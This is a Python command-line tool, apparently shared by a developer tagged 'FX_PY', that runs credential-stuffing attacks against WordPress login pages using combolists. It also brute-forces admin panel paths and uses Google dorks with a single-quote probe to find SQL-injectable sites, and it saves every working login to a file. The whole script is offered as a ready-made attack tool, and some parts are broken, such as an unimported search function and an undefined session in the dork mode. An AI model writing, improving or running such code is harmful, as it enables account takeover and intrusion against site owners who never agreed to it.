import requests

Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # Whit

import datetime
DATA=datetime.datetime.now()
print(f'''
      
      

{Yellow}[{White}#{Yellow}]{White} DATA {Red}[{Green}{datetime.datetime.now()}{Red}]


{Yellow}[{White}#{Yellow}]{White} INSTAGRAM {Yellow}:{Cyan} FX_PY3
{Yellow}[{White}#{Yellow}]{White} TELEGRAM {Yellow}:{Cyan} FX_PY

      
{Red} 

		██╗    ██╗██████╗     ██╗
		██║    ██║██╔══██╗    ██║
		██║ █╗ ██║██████╔╝    ██║
		██║███╗██║██╔═══╝     ╚═╝
		╚███╔███╔╝██║         ██╗
		 ╚══╝╚══╝ ╚═╝         ╚═╝

{Yellow} ---------------------------------------{White}
 {White}• 1 [{Yellow}#{White}] - Combo {Red}({Yellow}COMBO Admin_panel:user:pass{Red})
 {White}• 2 [{Yellow}#{White}] - Admin{Red} ({Yellow}Admin Panel | Combo user:pass{Red})
 {White}• 3 [{Yellow}#{White}] - Search Admin Panel{Red} ({Yellow}SERACH ADMIN PANEL{Red})
 {White}• 4 [{Yellow}#{White}] - Search SQL{Red} ({Yellow}SEARCH FOR DORK{Red})
{Yellow} ---------------------------------------{White}
 

''')

Choose = int(input(Yellow+f'•{White} CHOOSE >> '))
if Choose == 1 :
	file=input(Yellow+f'•{White} WORDPRESS ADMIN FILE >> ')
	print('')

				

	RQ,ERROR,Done=0,0,0

	for i in open(file,'r').read().splitlines():
		print(f'\r{Yellow}•{White} RQ {RQ} |{Yellow}• {Red}ERROR {ERROR} {Yellow}|•{Green} Done {Done} {Yellow}|{White}DEV : FX_PY',end="")
		RQ +=1
		
		
		
		
		try:
			url=i.split(' ')[0]
			users=i.split(' ')[1]
			user=users.split(':')[0]
			password=users.split(':')[1]
		
		
		except :
			url=i.split('#')[0]		
			users=i.split('#')[1]		
			user=users.split('@')[0]		
			password=users.split('@')[1]	
		
		
		
		
		
		
		try:
			
			r=requests.session()
			data={
				'log' : user ,
				'pwd' : password
			}
			request=r.post(url,data=data,timeout=5).text
			
			
			if 'Lost your password?' in request :
				pass
				
			
			else: 
				
				URL=url.split('/')[2]
				
				print('\n\n\n\r')
				
				print(f'''	
	{White}_ _ _ _ _ _ _ _ _ _ _ _ _
	{Yellow}•{White} Url | {URL}
	{Yellow}•{White} Admin | {url}
	{Yellow}•{White} username | {user}
	{Yellow}•{White} password | {password}
	{White}_ _ _ _ _ _ _ _ _ _ _ _ _
					
					''')
					
				Done+=1
				
				open('Done.txt','a').write(f' _ _ _ _ _ _ _ _ _ _ \n Url | {URL} \n Admin | {url} \n username | {user} \n password | {password} \n _ _ _ _ _ _ _ _ _ _ \n ')
				
				print('\n\n\n\r')
				
		except :
			
			ERROR+=1



elif Choose == 2 :
    url = input(Yellow+f'•{White} URL ADMIN PANEL >> ')
    file = input(Yellow+f'•{White} FIEL COMBO USER:PASS >> ')
    RQ,Done,ERROR=0,0,0
    for i in open(file,'r').read().splitlines():
        RQ+=1
        user = i.split(':')[0]
        password = i.split(':')[1]
        print(f'\r{Yellow}• {Red}BAD {ERROR} {Yellow}|•{Green} Done {Done} {Yellow}|{White}{user}:{password} DEV : FX_PY',end="")
        
        r=requests.session()
        data={
				'log' : user ,
				'pwd' : password
			}
        request=r.post(url,data=data,timeout=5).text
        if 'Lost your password?' in request :
            ERROR+=1
        else: 
            URL=url.split('/')[2]
            print('\n\n\n\r')
            print(f'''	
	{White}_ _ _ _ _ _ _ _ _ _ _ _ _
	{Yellow}•{White} Admin | {url}
	{Yellow}•{White} username | {user}
	{Yellow}•{White} password | {password}
	{White}_ _ _ _ _ _ _ _ _ _ _ _ _
					
					''')
            Done+=1
            open('Done.txt','a').write(f' _ _ _ _ _ _ _ _ _ _ \n Url | {URL} \n Admin | {url} \n username | {user} \n password | {password} \n _ _ _ _ _ _ _ _ _ _ \n ')
            print('\n\n\n\r')       








elif Choose==3:

  try:
  	a=open('ADMIN.txt','r')
  except :
  	print(Red+f'• FILE ({White}ADMIN.txt{Red}) NOT FOUND IN THE PATH !')
  	
  print(Yellow+'\n\n[!] • Enter the link like this \nhttps://Domen.com/\n')
  
  user=input(Yellow+f'•{White} ENTER URL : ')
  r=requests.session()
  def check():
  	rm =r.get(user,timeout=4).status_code
  	adn=a.readline().split('\n')[0]
  	print(user+adn)
  	try:
  	
  		o=user+adn
  		t = r.get(o,timeout=4)
  		if t == 200 :
  			print('='*9)
  			print(f'''
      	[{White}{DATA}{White}] \033[2;34m • done : {user}{adn} 
      	''')
  			print('='*9)
  			exit()
  		elif t == 404 :
  			print(f'{Red}[{White}{DATA}{Red}]\033[1;31m • [X] '+user+adn)
  		else :
  			print(Yellow+f'[{White}{DATA}{Yellow}] • [X] '+user+adn)
  	except :
  		print(Red+'[x] Something went wrong, check your entries ')
    
  while True:
    check()




elif Choose==4:
	dork=input(Yellow+f'•{White} Dork >> ')
	s=0
	q=0
	
	
	try:	
			
		for i in search(dork, tld="co.in", num=50000, stop=9000, pause=1):
			
			print(f"\r• RQ [{q}] | • DONE [{s}]",end="")
			
			try :
				
				if 'mysql' in r.get(i+"'").text:
					s=s+1
					print(f'\n {Yellow}• {White}An infected site has been detected | '+i)
			
				else:
					q=q+1
					
			except :
				pass
				
	except :
		print(Yellow+'• start vpn !')
		exit()
